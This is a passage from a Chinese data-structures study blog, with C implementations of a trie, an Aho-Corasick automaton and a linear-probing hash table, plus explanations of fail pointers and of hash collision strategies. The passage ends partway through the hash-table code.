code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> SIZE = <span class="hljs-number">26</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> BASE = <span class="hljs-string">'a'</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TrieNode</span> &#123;</span><br>    <span class="hljs-keyword">int</span> is_terminal;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TrieNode</span> **<span class="hljs-title">childs</span>;</span> <span class="hljs-comment">// 26个字母</span><br>&#125; TrieNode, *Trie;<br><br><br><span class="hljs-function">TrieNode* <span class="hljs-title">new_node</span><span class="hljs-params">()</span> </span>&#123;<br>    Trie p = (Trie)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(TrieNode));<br>    p-&gt;childs = (Trie *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Trie) *SIZE);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; SIZE; i++) &#123;<br>        p-&gt;childs[i] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p-&gt;is_terminal = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Trie t)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (t) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; SIZE; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (t-&gt;childs[i]) &#123;<br>                <span class="hljs-built_in">clear</span>(t-&gt;childs[i]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">free</span>(t-&gt;childs);<br>        <span class="hljs-built_in">free</span>(t);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 增肌一个参数 res，累计一段字符串中不同字串的个数。</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(Trie trie, <span class="hljs-keyword">char</span> *pattern, <span class="hljs-keyword">int</span> *res)</span> </span>&#123;<br>    TrieNode *p = trie;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(pattern); ++i) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;childs[pattern[i] - BASE] == <span class="hljs-literal">NULL</span>) &#123;<br>            p-&gt;childs[pattern[i] - BASE] = new_node();<br>            (*res)++;<br>        &#125;<br>        p = p-&gt;childs[pattern[i] - BASE];<br>    &#125;<br>    p-&gt;is_terminal = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(Trie trie, <span class="hljs-keyword">char</span> *<span class="hljs-built_in">buffer</span>)</span> </span>&#123;<br>    TrieNode *p = trie;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">buffer</span>); i++) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;childs[<span class="hljs-built_in">buffer</span>[i] - BASE] == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        p = p-&gt;childs[<span class="hljs-built_in">buffer</span>[i] - BASE];<br>    &#125;<br>    <span class="hljs-keyword">return</span> p-&gt;is_terminal;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> s[<span class="hljs-number">100005</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, s);<br><br>    <span class="hljs-comment">// 计算累计一段字符串中不同字串的个数。</span><br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    Trie root = new_node();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(s); ++i) &#123;<br>        insert(root, s + i, &amp;res);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, res);<br><br>    <span class="hljs-built_in">clear</span>(root);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="ac自动机">AC自动机</span></h3><p>处理多个模式串，在一个输入串 S 中搜索出现的模式串的问题。</p><p>AC自动机约等于Trie + KMP，加速多pattern匹配过程。</p><blockquote><ol type="1"><li>构建 patterns 的 Trie</li><li>构建 fail 指针</li><li>开始匹配</li></ol></blockquote><h4><span id="构建-fail-指针">构建 fail 指针</span></h4><ol type="1"><li>在Trie中，BFS遍历，第一层，fail指针都指向 root</li><li>第一层之后，每个节点的 fail 指针，指向【<strong>该节点的父节点</strong>】 的【<strong>fail指针指向的节点</strong>】 的【<strong>儿子节点</strong>】中【<strong>和该节点（自己）同字符的节点</strong>】。如果没有找到，【<strong>fail指针指向的节点</strong>】继续向上找fail 节点，直到 root。</li></ol><p>fail指针表示的是以当前字符作为开头的最长后缀所在的位置。</p><h4><span id="匹配过程">匹配过程</span></h4><ol type="1"><li>输入string s，trie从 root开始，进行匹配</li><li>当匹配失败，跳转到fail指针指向的节点，如果fail到root，输入此位置之后的string s的部分，继续查找。</li><li>当匹配成功（Trie标记的节点），也跳转到fail指针指向的节点，如果此时跳转到root，进行回溯到前一个最长的trie路径节点。</li></ol><p>下面的程序，输入一个字符串，输出输入串中出现多少个已知pattern。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> SIZE = <span class="hljs-number">26</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> BASE = <span class="hljs-string">'a'</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> MAX_SIZE = <span class="hljs-number">20005</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> MAX_LEN = <span class="hljs-number">25</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TrieNode</span> &#123;</span><br>    <span class="hljs-keyword">int</span> count;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TrieNode</span>** <span class="hljs-title">childs</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TrieNode</span>* <span class="hljs-title">fail</span>;</span><br>&#125; TrieNode, *Trie;<br><br><span class="hljs-function">TrieNode* <span class="hljs-title">new_node</span><span class="hljs-params">()</span> </span>&#123;<br>    TrieNode *p = (TrieNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(TrieNode));<br>    p-&gt;childs = (TrieNode **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(TrieNode *) * SIZE);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; SIZE; i++) &#123;<br>        p-&gt;childs[i] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    p-&gt;fail = <span class="hljs-literal">NULL</span>;<br>    p-&gt;count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(TrieNode *p)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; SIZE; i++) &#123;<br>            <span class="hljs-keyword">if</span> (p-&gt;childs[i] != <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-built_in">clear</span>(p-&gt;childs[i]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">free</span>(p-&gt;childs);<br>        <span class="hljs-built_in">free</span>(p);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 构建Trie，并记录每个pattern出现次数，保存在每个node的count属性中</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(Trie trie, <span class="hljs-keyword">char</span> *<span class="hljs-built_in">buffer</span>)</span> </span>&#123;<br>    TrieNode *p = trie;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">buffer</span>); i++) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;childs[<span class="hljs-built_in">buffer</span>[i] - BASE] == <span class="hljs-literal">NULL</span>) &#123;<br>            p-&gt;childs[<span class="hljs-built_in">buffer</span>[i] - BASE] = new_node();<br>        &#125;<br>        p = p-&gt;childs[<span class="hljs-built_in">buffer</span>[i] - BASE];<br>    &#125;<br>    p-&gt;count++;<br>&#125;<br><br><span class="hljs-comment">// 构建fail指针</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">build_automaton</span><span class="hljs-params">(Trie root)</span> </span>&#123;<br>    root-&gt;fail = root;<br>    TrieNode *q[MAX_SIZE]; <span class="hljs-comment">// 这里的BFS使用数组模拟queue</span><br>    <span class="hljs-keyword">int</span> l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    q[r++] = root;<br>    <span class="hljs-comment">// BFS</span><br>    <span class="hljs-keyword">while</span> (l &lt; r) &#123;<br>        TrieNode *now = q[l++];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; SIZE; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (now-&gt;childs[i] != <span class="hljs-literal">NULL</span>) &#123;<br>                TrieNode *child = now-&gt;childs[i];<br>                <span class="hljs-keyword">if</span> (now == root) &#123; <span class="hljs-comment">// root指向自己</span><br>                    child-&gt;fail = root;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    TrieNode *iter = now;<br>                    <span class="hljs-comment">// 找到fail指针中相同字符</span><br>                    <span class="hljs-keyword">while</span> (iter != root &amp;&amp; iter-&gt;fail-&gt;childs[i] == <span class="hljs-literal">NULL</span>) &#123;<br>                        iter = iter-&gt;fail;<br>                    &#125;<br>                    <span class="hljs-comment">// 检查是否可以从fail指针的child开始向下匹配</span><br>                    <span class="hljs-keyword">if</span> (iter-&gt;fail-&gt;childs[i] != <span class="hljs-literal">NULL</span>) &#123;<br>                        child-&gt;fail = iter-&gt;fail-&gt;childs[i];<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        child-&gt;fail = root;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-comment">// BFS 每一层node</span><br>                q[r++] = child;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">match_count</span><span class="hljs-params">(Trie root, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-built_in">buffer</span>)</span> </span>&#123;<br>    TrieNode *p = root;<br>    <span class="hljs-keyword">int</span> total_count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-built_in">buffer</span>[i]; ++i) &#123;<br>        <span class="hljs-comment">// pattern不匹配，向fail指针回溯</span><br>        <span class="hljs-keyword">while</span> (p != root &amp;&amp; p-&gt;childs[<span class="hljs-built_in">buffer</span>[i] - BASE] == <span class="hljs-literal">NULL</span>) &#123;<br>            p = p-&gt;fail;<br>        &#125;<br>        p = p-&gt;childs[<span class="hljs-built_in">buffer</span>[i] - BASE];<br>        <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>) &#123;<br>            p = root;<br>        &#125;<br>        <br>        <span class="hljs-comment">// 累加匹配成功的Trie树路径上，有效pattern的数量，因为回溯停止时，停在最大匹配处</span><br>        TrieNode *iter = p;<br>        <span class="hljs-keyword">while</span> (iter != root) &#123;<br>            total_count += iter-&gt;count;<br>            iter = iter-&gt;fail;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> total_count;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Trie root = new_node();<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-keyword">char</span> pattern[MAX_LEN];<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, pattern);<br>        insert(root, pattern);<br>    &#125;<br>    build_automaton(root);<br>    <span class="hljs-keyword">char</span> str_buffer[<span class="hljs-number">100005</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, str_buffer);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, match_count(root, str_buffer));<br>    <span class="hljs-built_in">clear</span>(root);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> Data Structure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> data structure </tag>
            
            <tag> cs basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构整理-part2</title>
      <link href="/posts/4121feda.html"/>
      <url>/posts/4121feda.html</url>
      
        <content type="html"><![CDATA[<h2><span id="哈希表">哈希表</span></h2><p>将key的值通过一个设计好的hash函数转换，在连续内存地址上寻址找到对应的值。</p><p>hash函数构造方法：</p><ul><li>直接寻址法：将key值线性的映射到存储地址上。少量key适用。</li><li>除留余数法：将key值对整数 <em>p</em>取的余数直接做为存储地址。一般选择不大于 <em>p</em> 的最大质数。</li><li>字符串hash的 BKD hash。</li><li>...</li></ul><p>hash函数设计要求计算简单，值尽量均匀分布。</p><h3><span id="冲突处理">冲突处理</span></h3><h4><span id="开放地址法">开放地址法</span></h4><p>如果发生冲突，那么就使用某种策略寻找下一存储地址，直到找到一个不冲突的地址或者找到关键字，否则一直按这种策略继续寻找。如果冲突次数达到了上限则终止程序，表示关键字不存在哈希表里。</p><ol type="1"><li>线性探测法，如果当前的冲突位置为 <span class="math inline">\(d\)</span>，那么接下来几个探测地址为 <span class="math inline">\(d + 1\)</span>，<span class="math inline">\(d +2\)</span>，<span class="math inline">\(d + 3\)</span>等，也就是从冲突地址往后面一个一个探测；</li><li>线性补偿探测法，它形成的探测地址为 <span class="math inline">\(d +m\)</span>，<span class="math inline">\(d + 2 \times m\)</span>，<span class="math inline">\(d + 3 \times m\)</span>等，与线性探测法不同，这里的查找单位不是 <span class="math inline">\(1\)</span>，而是 <span class="math inline">\(m\)</span>，为了能遍历到哈希表里所有位置，设置<span class="math inline">\(m\)</span> 和表长 <span class="math inline">\(size\)</span> 互质；</li><li>随机探测法，这种方法和前两种方法类似，这里的查找单位不是一个固定值，而是一个随机序列。</li><li>二次探测法，它形成的探测地址为 <span class="math inline">\(d +1^2\)</span>，<span class="math inline">\(d - 1^2\)</span>，<span class="math inline">\(d + 2^2\)</span>，<span class="math inline">\(d -2^2\)</span> 等，这种方法在冲突位置左右跳跃着寻找探测地址。</li></ol><p>规定，当冲突次数小于表长的一半时，就可以把字符串插入到哈希表中。而如果发生冲突次数大于表长的一半时，就需要调用重建函数去重建哈希表了，因为认为哈希表已经发生了“堆聚”现象，这种情况下要扩大哈希表的容量，提高查找和插入的效率。</p><p>开放地址法计算简单快捷，处理起来方便，但是也存在不少缺点。</p><p>线性探测法容易形成“堆聚”的情况，即很多记录就连在一块，而且一旦形成“堆聚”，记录会越聚越多。</p><p>另外，开放地址法都有一个缺点，删除操作显得十分复杂，不能直接删除关键字所在的记录，否则在查找删除位置后面的元素时，可能会出现找不到的情况，因为删除位置上已经成了空地址，查找到这里时会终止查找。</p><h4><span id="链地址法">链地址法</span></h4><p>该方法将所有哈希地址相同的结点构成一个单链表，单链表的头结点存在哈希数组里。链地址法常出现在经常插入和删除的情况下。</p><p>相比开放地址法，链地址法有以下优点：不会出现“堆聚”现象，哈希地址不同的关键字不会发生冲突；不需要重建哈希表，在开放地址法中，如果哈希表里存满关键字了就需要扩充哈希表然后重建哈希表，而在链地址法里，因为结点都是动态申请的，所以不会出现哈希表里存满关键字的情况；相比开放地址法，关键字删除更方便，只需要找到指定结点，删除该结点即可。</p><p>当然代价就是查找效率会稍低一点，但是对于hash来讲这一点效率影响在大多数非极端条件下，使用体验基本没有啥区别。</p><p>当关键字规模少的时候，开放地址法比链地址法更节省空间，因为用链地址法可能会存在哈希数组出现大量空地址的情况，而在关键字规模大的情况下，链地址法就比开放地址法更节省空间，链表产生的指针域可以忽略不计，关键字多，哈希数组里产生的空地址就少了。</p><h3><span id="实现线性探测法hash">实现线性探测法hash</span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HashTable</span> &#123;</span><br>    <span class="hljs-keyword">char</span> **elem;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>;<br>&#125; HashTable;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(HashTable *h)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(HashTable *h, <span class="hljs-keyword">char</span> value[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(HashTable *h, <span class="hljs-keyword">char</span> value[], <span class="hljs-keyword">int</span> *pos, <span class="hljs-keyword">int</span> *times)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(HashTable *h, <span class="hljs-keyword">char</span> value[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recreate</span><span class="hljs-params">(HashTable *h)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(HashTable *h)</span> </span>&#123;<br>    h-&gt;<span class="hljs-built_in">size</span> = <span class="hljs-number">2000</span>;<br>    h-&gt;elem = (<span class="hljs-keyword">char</span> **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span> *) * h-&gt;<span class="hljs-built_in">size</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; h-&gt;<span class="hljs-built_in">size</span>; i++) &#123;<br>        h-&gt;elem[i] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(HashTable *h, <span class="hljs-keyword">char</span> value[])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> code = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(value); i++) &#123;<br>        code = (code * <span class="hljs-number">256</span> + value[i] + <span class="hljs-number">128</span>) % h-&gt;<span class="hljs-built_in">size</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> code;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(HashTable *h, <span class="hljs-keyword">char</span> value[], <span class="hljs-keyword">int</span> *pos, <span class="hljs-keyword">int</span> *times)</span> </span>&#123;<br>    *pos = hash(h, value);<br>    *times = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (h-&gt;elem[*pos] != <span class="hljs-literal">NULL</span> &amp;&amp; <span class="hljs-built_in">strcmp</span>(h-&gt;elem[*pos], value) != <span class="hljs-number">0</span>) &#123;<br>        (*times)++;<br>        <span class="hljs-keyword">if</span> (*times &lt; h-&gt;<span class="hljs-built_in">size</span>) 